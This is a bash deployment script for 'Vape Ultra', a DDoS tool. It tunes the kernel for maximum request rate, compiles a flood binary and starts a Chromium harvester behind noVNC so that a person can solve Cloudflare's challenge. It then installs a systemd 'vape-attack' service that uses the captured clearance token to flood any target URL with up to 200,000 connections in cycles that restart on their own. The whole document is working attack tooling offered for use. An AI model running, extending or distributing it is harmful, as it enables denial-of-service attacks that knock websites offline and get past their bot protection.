#!/usr/bin/env bash
# =============================================================================
#  Vape_setup.sh — Full Vape Ultra L7 Node Setup
#  Developer: @Paxjest  Engine: @Xstairs
#
#  Single command sets up everything:
#    1.  Install packages (build tools, libssl-dev, Xvfb, x11vnc, noVNC)
#    2.  Apply maximum kernel/OS tuning for peak RPS
#    3.  Compile vape_ultra (-O3, native, OpenSSL)
#    4.  Install Python + Playwright + Chromium
#    5.  Start Xvfb virtual display + x11vnc + noVNC (systemd services)
#    6.  Launch l7_harvester.py inside virtual display
#    7.  Print noVNC browser URL — you connect once, solve CF challenge
#    8.  Auto-detect session.json, launch vape_ultra at max performance
#
#  Usage:
#    sudo bash Vape_setup.sh https://target.com
#    sudo bash Vape_setup.sh https://target.com --method l4
#    sudo bash Vape_setup.sh https://target.com --conns 80000 --dur 3600
#
#  Flags:
#    --port   <n>    Override target port (default: 443 for https)
#    --path   <str>  Override URL path    (default: /)
#    --method <m>    l4 | l4_lownet | l7 | l7_lownet  (default: l7)
#    --conns  <n>    Override connections (default: auto from RAM)
#    --dur    <sec>  Duration per cycle   (default: 86400)
#    --vnc-port <n>  noVNC web port       (default: 6080)
#    --skip-compile  Skip recompiling if vape_ultra already exists
#    --skip-tune     Skip kernel tuning
# =============================================================================

# NOTE: intentionally NOT using set -e so partial failures don't kill the run.
# Errors are checked and reported explicitly at each critical step.
set -uo pipefail

# ─── Colours ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'
log_info()  { echo -e "${CYN}[INFO]${RST}  $*"; }
log_ok()    { echo -e "${GRN}[  OK]${RST}  $*"; }
log_warn()  { echo -e "${YLW}[WARN]${RST}  $*"; }
log_err()   { echo -e "${RED}[ERR ]${RST}  $*" >&2; }
log_step()  { echo -e "\n${BLD}${YLW}══ $* ══${RST}"; }
die()       { log_err "$*"; exit 1; }

# ─── Root check ───────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && die "Run as root:  sudo bash Vape_setup.sh https://target.com"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ─── Argument parsing ─────────────────────────────────────────────────────────
TARGET_URL=""
TARGET_PORT=443
TARGET_PATH="/"
ATTACK_METHOD="l7"
OVERRIDE_CONNS=0
ATTACK_DUR=86400
VNC_PORT=6080
SKIP_COMPILE=0
SKIP_TUNE=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        http://*|https://*) TARGET_URL="$1"; shift ;;
        --port)       TARGET_PORT="$2";    shift 2 ;;
        --path)       TARGET_PATH="$2";    shift 2 ;;
        --method)     ATTACK_METHOD="$2";  shift 2 ;;
        --conns)      OVERRIDE_CONNS="$2"; shift 2 ;;
        --dur)        ATTACK_DUR="$2";     shift 2 ;;
        --vnc-port)   VNC_PORT="$2";       shift 2 ;;
        --skip-compile) SKIP_COMPILE=1;    shift ;;
        --skip-tune)  SKIP_TUNE=1;         shift ;;
        *)
            [[ "$1" != --* ]] && TARGET_URL="https://$1"
            shift
            ;;
    esac
done

if [[ -z "$TARGET_URL" ]]; then
    printf "Enter target URL (e.g. https://target.com): "
    read -r TARGET_URL
    [[ "$TARGET_URL" != http* ]] && TARGET_URL="https://${TARGET_URL}"
fi

TARGET_URL="${TARGET_URL%/}"
TARGET_HOST=$(python3 -c "
from urllib.parse import urlparse
u = urlparse('${TARGET_URL}')
print(u.hostname or '')
" 2>/dev/null)
[[ -z "$TARGET_HOST" ]] && die "Cannot parse host from: $TARGET_URL"

# ─── File paths ───────────────────────────────────────────────────────────────
ULTRA_BIN="$SCRIPT_DIR/vape_ultra"
SESSION_JSON="$SCRIPT_DIR/session.json"
HARVESTER="$SCRIPT_DIR/l7_harvester.py"
SESSION_READ="$SCRIPT_DIR/session_read.py"
VAPE_DIR="/etc/vape"
ATTACK_WRAPPER="$VAPE_DIR/attack_wrapper.sh"
DISPLAY_NUM=99
VNC_RFBPORT=5910

mkdir -p "$VAPE_DIR"

# ─── Banner ───────────────────────────────────────────────────────────────────
echo -e "${BLD}"
echo "  ╔══════════════════════════════════════════════════════╗"
echo "  ║        Vape Ultra v1.2 — Full Node Setup             ║"
echo "  ║        Developer: @Paxjest  Engine: @Xstairs         ║"
echo "  ╚══════════════════════════════════════════════════════╝"
echo -e "${RST}"
log_info "Target  : ${TARGET_URL}"
log_info "Method  : ${ATTACK_METHOD}"
log_info "noVNC   : port ${VNC_PORT}"

# =============================================================================
# STEP 1 — Packages
# =============================================================================
log_step "1/8  Installing packages"
export DEBIAN_FRONTEND=noninteractive

if command -v apt-get &>/dev/null; then
    apt-get update -qq 2>/dev/null || log_warn "apt update had warnings (continuing)"
    apt-get install -y -qq \
        build-essential g++ gcc make libssl-dev \
        python3 python3-pip \
        xvfb x11vnc websockify \
        xfce4 xfce4-terminal dbus-x11 \
        wget curl git net-tools iproute2 \
        htop ethtool numactl \
        libnss3 libatk1.0-0 libatk-bridge2.0-0 \
        libcups2 libxkbcommon0 libxcomposite1 \
        libxrandr2 libgbm1 libpango-1.0-0 \
        libcairo2 libasound2 2>/dev/null || true

    # noVNC web files
    if [[ ! -f /usr/share/novnc/vnc.html ]]; then
        apt-get install -y -qq novnc 2>/dev/null || true
    fi
    if [[ ! -f /usr/share/novnc/vnc.html ]]; then
        log_info "noVNC package not found — cloning from GitHub..."
        git clone --depth 1 https://github.com/novnc/noVNC.git /usr/share/novnc 2>/dev/null || true
    fi

elif command -v dnf &>/dev/null; then
    dnf install -y gcc-c++ openssl-devel python3 python3-pip \
        xorg-x11-server-Xvfb x11vnc python3-websockify git wget curl \
        net-tools 2>/dev/null || true
elif command -v yum &>/dev/null; then
    yum install -y gcc-c++ openssl-devel python3 python3-pip \
        xorg-x11-server-Xvfb x11vnc git wget curl net-tools 2>/dev/null || true
fi

log_ok "Packages done."

# =============================================================================
# STEP 2 — Kernel / OS tuning
# =============================================================================
if [[ "$SKIP_TUNE" -eq 1 ]]; then
    log_warn "Skipping kernel tuning (--skip-tune passed)"
else
    log_step "2/8  Kernel & OS tuning for maximum RPS"

    # CPU governor
    for gov in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
        echo performance > "$gov" 2>/dev/null || true
    done
    for st in /sys/devices/system/cpu/cpu*/cpuidle/state[1-9]/disable; do
        echo 1 > "$st" 2>/dev/null || true
    done
    [[ -f /sys/devices/system/cpu/intel_pstate/no_turbo ]] && \
        echo 0 > /sys/devices/system/cpu/intel_pstate/no_turbo 2>/dev/null || true

    sysctl -w kernel.numa_balancing=0                    >/dev/null 2>&1 || true
    sysctl -w net.ipv4.ip_local_port_range="1024 65535"  >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_tw_reuse=1                    >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_fin_timeout=3                 >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_max_tw_buckets=2000000        >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_synack_retries=1              >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_syn_retries=1                 >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_orphan_retries=1              >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_max_orphans=262144            >/dev/null 2>&1 || true
    sysctl -w net.ipv4.ip_nonlocal_bind=1                >/dev/null 2>&1 || true
    sysctl -w net.core.rmem_max=268435456                >/dev/null 2>&1 || true
    sysctl -w net.core.wmem_max=268435456                >/dev/null 2>&1 || true
    sysctl -w net.core.rmem_default=67108864             >/dev/null 2>&1 || true
    sysctl -w net.core.wmem_default=67108864             >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_rmem="4096 131072 268435456"  >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_wmem="4096 131072 268435456"  >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_mem="786432 2097152 33554432" >/dev/null 2>&1 || true
    sysctl -w net.ipv4.udp_mem="786432 2097152 33554432" >/dev/null 2>&1 || true
    sysctl -w net.core.somaxconn=262144                  >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_max_syn_backlog=262144        >/dev/null 2>&1 || true
    sysctl -w net.core.netdev_max_backlog=262144         >/dev/null 2>&1 || true
    sysctl -w net.core.netdev_budget=600                 >/dev/null 2>&1 || true
    sysctl -w net.core.netdev_budget_usecs=8000          >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_fastopen=3                    >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_keepalive_time=10             >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_keepalive_intvl=3             >/dev/null 2>&1 || true
    sysctl -w net.ipv4.tcp_keepalive_probes=3            >/dev/null 2>&1 || true
    sysctl -w net.ipv4.neigh.default.gc_thresh1=32768    >/dev/null 2>&1 || true
    sysctl -w net.ipv4.neigh.default.gc_thresh2=131072   >/dev/null 2>&1 || true
    sysctl -w net.ipv4.neigh.default.gc_thresh3=262144   >/dev/null 2>&1 || true
    sysctl -w net.core.optmem_max=25165824               >/dev/null 2>&1 || true
    sysctl -w net.core.busy_poll=50                      >/dev/null 2>&1 || true
    sysctl -w net.core.busy_read=50                      >/dev/null 2>&1 || true
    sysctl -w vm.swappiness=0                            >/dev/null 2>&1 || true
    sysctl -w vm.dirty_ratio=80                          >/dev/null 2>&1 || true
    sysctl -w vm.dirty_background_ratio=5                >/dev/null 2>&1 || true
    sysctl -w vm.overcommit_memory=1                     >/dev/null 2>&1 || true
    sysctl -w vm.max_map_count=1048576                   >/dev/null 2>&1 || true
    sysctl -w fs.file-max=26843545                       >/dev/null 2>&1 || true
    sysctl -w fs.nr_open=26843545                        >/dev/null 2>&1 || true

    # Persistent FD limits
    grep -v "# vape-tune" /etc/security/limits.conf > /tmp/_vape_lim 2>/dev/null || true
    cp /tmp/_vape_lim /etc/security/limits.conf 2>/dev/null || true
    cat >> /etc/security/limits.conf <<'LIMITS'
# vape-tune
*    soft nofile 1048576
*    hard nofile 1048576
root soft nofile 1048576
root hard nofile 1048576
*    soft nproc  1048576
*    hard nproc  1048576
LIMITS

    ulimit -n 1048576 2>/dev/null || true
    ulimit -u 1048576 2>/dev/null || true

    if command -v systemctl &>/dev/null; then
        mkdir -p /etc/systemd/system.conf.d
        cat > /etc/systemd/system.conf.d/vape.conf <<'SYSD'
[Manager]
DefaultLimitNOFILE=1048576
DefaultLimitNPROC=1048576
SYSD
    fi

    # NIC tuning
    for iface in $(ls /sys/class/net/ 2>/dev/null | grep -E '^(eth|ens|enp|eno)'); do
        ethtool -G "$iface" rx 4096 tx 4096 2>/dev/null || true
        ethtool -K "$iface" gro on gso on tso on 2>/dev/null || true
        ethtool -L "$iface" combined "$(nproc)" 2>/dev/null || true
    done

    log_ok "Kernel tuning applied."
fi

# =============================================================================
# STEP 3 — Compile vape_ultra
# =============================================================================
log_step "3/8  Compiling vape_ultra"

if [[ "$SKIP_COMPILE" -eq 1 && -x "$ULTRA_BIN" ]]; then
    log_warn "Using existing binary (--skip-compile)"
else
    [[ ! -f "$SCRIPT_DIR/Vape_Ultra_1.2.cpp" ]] && \
        die "Vape_Ultra_1.2.cpp not found in $SCRIPT_DIR"

    log_info "Compiling with -O3..."
    if g++ -O3 -march=native -mtune=native \
           -funroll-loops -fno-plt          \
           -ffast-math -fomit-frame-pointer \
           -std=c++17                       \
           -o "$ULTRA_BIN"                  \
           "$SCRIPT_DIR/Vape_Ultra_1.2.cpp" \
           -lpthread -lssl -lcrypto 2>&1; then
        strip "$ULTRA_BIN"
        log_ok "Compiled → $ULTRA_BIN  ($(du -sh "$ULTRA_BIN" | cut -f1))"
    else
        die "Compilation failed. Check that libssl-dev is installed."
    fi
fi

# =============================================================================
# STEP 4 — Auto-calculate max connection count
# =============================================================================
log_step "4/8  Calculating optimal performance parameters"

CORES=$(nproc)
RAM_KB=$(grep MemTotal /proc/meminfo | awk '{print $2}')
RAM_MB=$((RAM_KB / 1024))

# Reserve 1.5 GB for OS + VNC + harvester; each L7 TLS conn ~32 KB
USABLE_MB=$((RAM_MB - 1536))
[[ $USABLE_MB -lt 512 ]] && USABLE_MB=512
MAX_CONNS=$(( (USABLE_MB * 1024) / 32 ))
[[ $MAX_CONNS -gt 200000 ]] && MAX_CONNS=200000
[[ $MAX_CONNS -lt 5000   ]] && MAX_CONNS=5000

[[ $OVERRIDE_CONNS -gt 0 ]] && MAX_CONNS=$OVERRIDE_CONNS

MAX_THREADS=$CORES
[[ $MAX_THREADS -lt 2 ]] && MAX_THREADS=2

log_ok "RAM: ${RAM_MB} MB  CPUs: ${CORES}  Connections: ${MAX_CONNS}  Threads: ${MAX_THREADS}"

# =============================================================================
# STEP 5 — Python + Playwright + Chromium
# =============================================================================
log_step "5/8  Installing Playwright + Chromium"

PIP_FLAGS="--quiet --break-system-packages --ignore-installed"
python3 -m pip install $PIP_FLAGS playwright flask 2>/dev/null || \
    python3 -m pip install --quiet playwright flask 2>/dev/null || true

log_info "Installing Chromium binaries (1–3 min on first run)..."
python3 -m playwright install chromium 2>/dev/null || true
python3 -m playwright install-deps chromium 2>/dev/null || true
log_ok "Playwright + Chromium ready."

# =============================================================================
# STEP 6 — Virtual display + noVNC services
# =============================================================================
log_step "6/8  Setting up Xvfb + x11vnc + noVNC"

# ── Verify required binaries ──────────────────────────────────────────────────
XVFB_BIN=$(command -v Xvfb 2>/dev/null || command -v Xvfb 2>/dev/null || echo "")
X11VNC_BIN=$(command -v x11vnc 2>/dev/null || echo "")
WEBSOCKIFY_BIN=$(command -v websockify 2>/dev/null || \
                  command -v websockify3 2>/dev/null || \
                  python3 -c "import websockify; import os; \
                  print(os.path.join(os.path.dirname(websockify.__file__),'websockify'))" \
                  2>/dev/null || echo "")

[[ -z "$XVFB_BIN"      ]] && die "Xvfb not found after install. Run: apt-get install -y xvfb"
[[ -z "$X11VNC_BIN"    ]] && die "x11vnc not found after install. Run: apt-get install -y x11vnc"

# websockify fallback: try running as python module
if [[ -z "$WEBSOCKIFY_BIN" ]]; then
    python3 -m websockify --help &>/dev/null && WEBSOCKIFY_BIN="python3 -m websockify" || true
fi
[[ -z "$WEBSOCKIFY_BIN" ]] && die "websockify not found. Run: apt-get install -y websockify"

log_info "Xvfb     : $XVFB_BIN"
log_info "x11vnc   : $X11VNC_BIN"
log_info "websockify: $WEBSOCKIFY_BIN"

# ── Find noVNC web files ──────────────────────────────────────────────────────
NOVNC_PATH=""
for p in /usr/share/novnc /usr/local/share/novnc /opt/novnc "$SCRIPT_DIR/novnc"; do
    [[ -f "$p/vnc.html" ]] && { NOVNC_PATH="$p"; break; }
done
if [[ -z "$NOVNC_PATH" ]]; then
    log_warn "noVNC web files not found — cloning now..."
    git clone --depth 1 https://github.com/novnc/noVNC.git /usr/share/novnc 2>/dev/null && \
        NOVNC_PATH="/usr/share/novnc" || die "Cannot get noVNC web files."
fi
log_info "noVNC    : $NOVNC_PATH"

# ── Generate VNC password (plain file — x11vnc reads it with -passwdfile) ─────
VNC_PASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 10)
printf "%s\n" "$VNC_PASS" > "$VAPE_DIR/vnc_password.txt"
chmod 600 "$VAPE_DIR/vnc_password.txt"
log_info "VNC password generated."

# ── Detect dbus-launch ────────────────────────────────────────────────────────
DBUS_PREFIX=""
command -v dbus-launch &>/dev/null && DBUS_PREFIX="dbus-launch --exit-with-session "

# ── Write systemd units ───────────────────────────────────────────────────────

# Xvfb
cat > /etc/systemd/system/vape-xvfb.service <<UNIT
[Unit]
Description=Vape Virtual Display (Xvfb :${DISPLAY_NUM})
After=network.target

[Service]
Type=simple
ExecStart=${XVFB_BIN} :${DISPLAY_NUM} -screen 0 1280x800x24 -ac +extension GLX +render
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

# XFCE desktop session
cat > /etc/systemd/system/vape-desktop.service <<UNIT
[Unit]
Description=Vape XFCE Desktop
After=vape-xvfb.service
Requires=vape-xvfb.service

[Service]
Type=simple
Environment=DISPLAY=:${DISPLAY_NUM}
Environment=HOME=/root
ExecStart=${DBUS_PREFIX}startxfce4
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
UNIT

# x11vnc  (uses plain passwdfile — no storepasswd needed)
cat > /etc/systemd/system/vape-vnc.service <<UNIT
[Unit]
Description=Vape VNC Server
After=vape-xvfb.service vape-desktop.service
Requires=vape-xvfb.service

[Service]
Type=simple
Environment=DISPLAY=:${DISPLAY_NUM}
ExecStart=${X11VNC_BIN} \
    -display :${DISPLAY_NUM} \
    -rfbport ${VNC_RFBPORT}  \
    -passwdfile ${VAPE_DIR}/vnc_password.txt \
    -listen 127.0.0.1        \
    -forever                 \
    -noxrecord               \
    -shared
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

# noVNC websockify
cat > /etc/systemd/system/vape-novnc.service <<UNIT
[Unit]
Description=Vape noVNC Web Interface (port ${VNC_PORT})
After=vape-vnc.service
Requires=vape-xvfb.service

[Service]
Type=simple
ExecStart=${WEBSOCKIFY_BIN} --web=${NOVNC_PATH} 0.0.0.0:${VNC_PORT} 127.0.0.1:${VNC_RFBPORT}
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

# ── Build harvester args (no inline Python needed) ────────────────────────────
HARVESTER_ARGS="$TARGET_URL --session $SESSION_JSON"
if [[ "$TARGET_PORT" -ne 443 && "$TARGET_PORT" -ne 80 ]]; then
    HARVESTER_ARGS="$HARVESTER_ARGS --port $TARGET_PORT"
fi
[[ "$TARGET_PATH" != "/" ]] && HARVESTER_ARGS="$HARVESTER_ARGS --path $TARGET_PATH"

# l7_harvester service
cat > /etc/systemd/system/vape-harvester.service <<UNIT
[Unit]
Description=Vape L7 CF Session Harvester
After=vape-desktop.service vape-xvfb.service
Requires=vape-xvfb.service

[Service]
Type=simple
Environment=DISPLAY=:${DISPLAY_NUM}
Environment=HOME=/root
WorkingDirectory=${SCRIPT_DIR}
ExecStart=python3 ${HARVESTER} ${HARVESTER_ARGS}
Restart=on-failure
RestartSec=30
StandardOutput=append:${VAPE_DIR}/harvester.log
StandardError=append:${VAPE_DIR}/harvester.log

[Install]
WantedBy=multi-user.target
UNIT

# ── Enable + start all services ───────────────────────────────────────────────
systemctl daemon-reload

for svc in vape-xvfb vape-desktop vape-vnc vape-novnc vape-harvester; do
    systemctl enable --quiet "$svc" 2>/dev/null || true
done

log_info "Starting Xvfb..."
systemctl restart vape-xvfb
sleep 3

log_info "Starting XFCE desktop..."
systemctl restart vape-desktop
sleep 4

log_info "Starting x11vnc..."
systemctl restart vape-vnc
sleep 2

log_info "Starting noVNC..."
systemctl restart vape-novnc
sleep 2

log_info "Starting harvester..."
systemctl restart vape-harvester
sleep 2

# Verify services started
FAILED=""
for svc in vape-xvfb vape-vnc vape-novnc; do
    STATUS=$(systemctl is-active "$svc" 2>/dev/null || echo "failed")
    if [[ "$STATUS" != "active" ]]; then
        log_warn "$svc status: $STATUS"
        FAILED="$FAILED $svc"
    else
        log_ok "$svc: active"
    fi
done

if [[ -n "$FAILED" ]]; then
    log_warn "Some services not active:${FAILED}"
    log_warn "Check with: journalctl -u <service-name> -n 30"
    log_warn "Continuing anyway — you can fix and restart manually."
fi

log_ok "Virtual display + noVNC launched."

# =============================================================================
# STEP 7 — Show browser URL and wait for session.json
# =============================================================================
log_step "7/8  Waiting for CF session token"

PUB_IP=$(curl -s --max-time 6 ifconfig.me 2>/dev/null || \
         curl -s --max-time 6 api.ipify.org 2>/dev/null || \
         hostname -I | awk '{print $1}')

echo ""
echo -e "${BLD}${GRN}╔══════════════════════════════════════════════════════════╗${RST}"
echo -e "${BLD}${GRN}║          OPEN THIS IN YOUR BROWSER NOW                   ║${RST}"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
printf "${BLD}${GRN}║${RST}  URL      : ${BLD}http://%s:%s/vnc.html${RST}\n" "$PUB_IP" "$VNC_PORT"
printf "${BLD}${GRN}║${RST}  Password : ${BLD}%s${RST}\n" "$VNC_PASS"
printf "${BLD}${GRN}║${RST}  Target   : ${BLD}%s${RST}\n" "$TARGET_URL"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  1. Open the URL above in your browser"
echo -e "${BLD}${GRN}║${RST}  2. Click Connect — enter the password shown above"
echo -e "${BLD}${GRN}║${RST}  3. You will see Chrome open at the target site"
echo -e "${BLD}${GRN}║${RST}  4. If Cloudflare shows a challenge — solve it"
echo -e "${BLD}${GRN}║${RST}  5. This script detects the token and starts vape_ultra"
echo -e "${BLD}${GRN}║${RST}     automatically — no further action needed"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  Harvester log: tail -f ${VAPE_DIR}/harvester.log"
echo -e "${BLD}${GRN}╚══════════════════════════════════════════════════════════╝${RST}"
echo ""
log_warn "Firewall: open port ${VNC_PORT} to YOUR IP only. Close it after harvesting."
echo ""

# ── Poll session.json until valid ─────────────────────────────────────────────
SESSION_TIMEOUT=900     # wait up to 15 minutes
POLL_SEC=3
elapsed=0
spin_chars=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
spin_idx=0

while true; do
    VALID=""
    if [[ -f "$SESSION_JSON" ]]; then
        VALID=$(python3 "$SESSION_READ" "$SESSION_JSON" valid 2>/dev/null | head -1 || echo "")
    fi

    if [[ "$VALID" == VALID* ]]; then
        echo ""
        log_ok "Session captured! ($VALID)"
        break
    fi

    if [[ $elapsed -ge $SESSION_TIMEOUT ]]; then
        echo ""
        log_err "Timed out after ${SESSION_TIMEOUT}s waiting for session."
        log_warn "Once you have session.json, run the attack manually:"
        log_warn "  $ATTACK_WRAPPER"
        log_info "Harvester log: tail -f ${VAPE_DIR}/harvester.log"
        exit 1
    fi

    spin_c="${spin_chars[$spin_idx]}"
    spin_idx=$(( (spin_idx + 1) % ${#spin_chars[@]} ))
    printf "\r  ${CYN}%s${RST} Waiting for cf_clearance token... %ds elapsed  " \
           "$spin_c" "$elapsed"

    sleep $POLL_SEC
    elapsed=$((elapsed + POLL_SEC))
done

# =============================================================================
# STEP 8 — Build attack wrapper + launch
# =============================================================================
log_step "8/8  Launching vape_ultra at maximum performance"

# Read host + port from the session file (safe — uses session_read.py)
SESSION_ARGS=$(python3 "$SESSION_READ" "$SESSION_JSON" args 2>/dev/null)
SESSION_HOST=$(echo "$SESSION_ARGS" | sed -n '1p')
SESSION_PORT=$(echo "$SESSION_ARGS" | sed -n '2p')

# Fallback to TARGET values if session_read failed
[[ -z "$SESSION_HOST" ]] && SESSION_HOST="$TARGET_HOST"
[[ -z "$SESSION_PORT" ]] && SESSION_PORT="$TARGET_PORT"

log_info "Host       : $SESSION_HOST"
log_info "Port       : $SESSION_PORT"
log_info "Method     : $ATTACK_METHOD"
log_info "Connections: $MAX_CONNS"
log_info "Threads    : $MAX_THREADS (pinned to CPU cores)"
log_info "Duration   : ${ATTACK_DUR}s per cycle (auto-restarts)"

# ── Write attack_wrapper.sh (plain file, zero inline Python quoting issues) ───
cat > "$ATTACK_WRAPPER" <<WRAPPER_EOF
#!/usr/bin/env bash
# Vape Ultra — attack wrapper
# Auto-restarts each cycle, waits for a valid session before each run.
# Developer: @Paxjest  Engine: @Xstairs

ULTRA_BIN="${ULTRA_BIN}"
SESSION_JSON="${SESSION_JSON}"
SESSION_READ="${SESSION_READ}"
ATTACK_LOG="${VAPE_DIR}/attack.log"
HOST="${SESSION_HOST}"
PORT="${SESSION_PORT}"
METHOD="${ATTACK_METHOD}"
MAX_CONNS="${MAX_CONNS}"
MAX_THREADS="${MAX_THREADS}"
ATTACK_DUR="${ATTACK_DUR}"

mkdir -p "$(dirname "\$ATTACK_LOG")"

log() { echo "[\$(date '+%H:%M:%S')] \$*" | tee -a "\$ATTACK_LOG"; }

log "Attack wrapper started."
log "Target: \${HOST}:\${PORT}  Method: \${METHOD}  Conns: \${MAX_CONNS}  Threads: \${MAX_THREADS}"

while true; do
    # Wait for a valid (non-expired) session before each cycle
    WAIT_SECS=0
    while true; do
        VCHK=\$(python3 "\$SESSION_READ" "\$SESSION_JSON" valid 2>/dev/null | head -1 || echo "")
        if [[ "\$VCHK" == VALID* ]]; then
            break
        fi
        if [[ \$WAIT_SECS -eq 0 ]]; then
            log "Session not valid yet (\$VCHK) — waiting for harvester..."
        fi
        sleep 10
        WAIT_SECS=\$((WAIT_SECS + 10))
        # Re-read host/port from session in case harvester updated it
        NEW_ARGS=\$(python3 "\$SESSION_READ" "\$SESSION_JSON" args 2>/dev/null || echo "")
        [[ -n "\$NEW_ARGS" ]] && {
            HOST=\$(echo "\$NEW_ARGS" | sed -n '1p')
            PORT=\$(echo "\$NEW_ARGS" | sed -n '2p')
        }
    done

    # Re-read host/port from session (may have changed after refresh)
    NEW_ARGS=\$(python3 "\$SESSION_READ" "\$SESSION_JSON" args 2>/dev/null || echo "")
    if [[ -n "\$NEW_ARGS" ]]; then
        HOST=\$(echo "\$NEW_ARGS" | sed -n '1p')
        PORT=\$(echo "\$NEW_ARGS" | sed -n '2p')
    fi

    log "--- Cycle start: \${HOST}:\${PORT} method=\${METHOD} conns=\${MAX_CONNS} threads=\${MAX_THREADS} dur=\${ATTACK_DUR}s ---"

    "\$ULTRA_BIN" \
        "\$HOST"        \
        "\$PORT"        \
        "\$METHOD"      \
        "\$MAX_CONNS"   \
        "\$MAX_THREADS" \
        "\$ATTACK_DUR"  \
        "\$SESSION_JSON" \
        >> "\$ATTACK_LOG" 2>&1 || true

    log "--- Cycle ended. Restarting in 2s... ---"
    sleep 2
done
WRAPPER_EOF

chmod +x "$ATTACK_WRAPPER"

# ── Attack systemd service ────────────────────────────────────────────────────
cat > /etc/systemd/system/vape-attack.service <<UNIT
[Unit]
Description=Vape Ultra Attack Engine
After=network.target vape-harvester.service

[Service]
Type=simple
WorkingDirectory=${SCRIPT_DIR}
ExecStart=${ATTACK_WRAPPER}
Restart=always
RestartSec=5
LimitNOFILE=1048576
LimitNPROC=1048576
OOMScoreAdjust=-900

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --quiet vape-attack
systemctl restart vape-attack
sleep 2

ATTACK_STATUS=$(systemctl is-active vape-attack 2>/dev/null || echo "unknown")

# =============================================================================
# Final summary
# =============================================================================
PUB_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')

echo ""
echo -e "${BLD}${GRN}╔══════════════════════════════════════════════════════════╗${RST}"
echo -e "${BLD}${GRN}║                  SETUP COMPLETE                          ║${RST}"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
printf "${BLD}${GRN}║${RST}  Attack status : ${BLD}%s${RST}\n" "$ATTACK_STATUS"
printf "${BLD}${GRN}║${RST}  Target        : ${BLD}%s:%s${RST}\n" "$SESSION_HOST" "$SESSION_PORT"
printf "${BLD}${GRN}║${RST}  Method        : ${BLD}%s${RST}\n" "$ATTACK_METHOD"
printf "${BLD}${GRN}║${RST}  Connections   : ${BLD}%s${RST}\n" "$MAX_CONNS"
printf "${BLD}${GRN}║${RST}  Threads       : ${BLD}%s${RST}\n" "$MAX_THREADS"
printf "${BLD}${GRN}║${RST}  RAM           : ${BLD}%s MB${RST}\n" "$RAM_MB"
printf "${BLD}${GRN}║${RST}  CPUs          : ${BLD}%s${RST}\n" "$CORES"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
printf "${BLD}${GRN}║${RST}  noVNC URL     : ${BLD}http://%s:%s/vnc.html${RST}\n" "$PUB_IP" "$VNC_PORT"
printf "${BLD}${GRN}║${RST}  VNC Password  : ${BLD}%s${RST}\n" "$VNC_PASS"
echo -e "${BLD}${GRN}╠══════════════════════════════════════════════════════════╣${RST}"
echo -e "${BLD}${GRN}║${RST}  Live attack log   : tail -f ${VAPE_DIR}/attack.log"
echo -e "${BLD}${GRN}║${RST}  Harvester log     : tail -f ${VAPE_DIR}/harvester.log"
echo -e "${BLD}${GRN}║${RST}  Attack status     : systemctl status vape-attack"
echo -e "${BLD}${GRN}║${RST}  Stop attack       : systemctl stop vape-attack"
echo -e "${BLD}${GRN}║${RST}  New session       : systemctl restart vape-harvester"
echo -e "${BLD}${GRN}║${RST}  Session info      : python3 ${SESSION_READ} ${SESSION_JSON} all"
echo -e "${BLD}${GRN}╚══════════════════════════════════════════════════════════╝${RST}"
echo ""
log_warn "Session refreshes every 25 min automatically. If a new CF challenge"
log_warn "appears, open noVNC and solve it — the attack wrapper waits for you."
echo ""
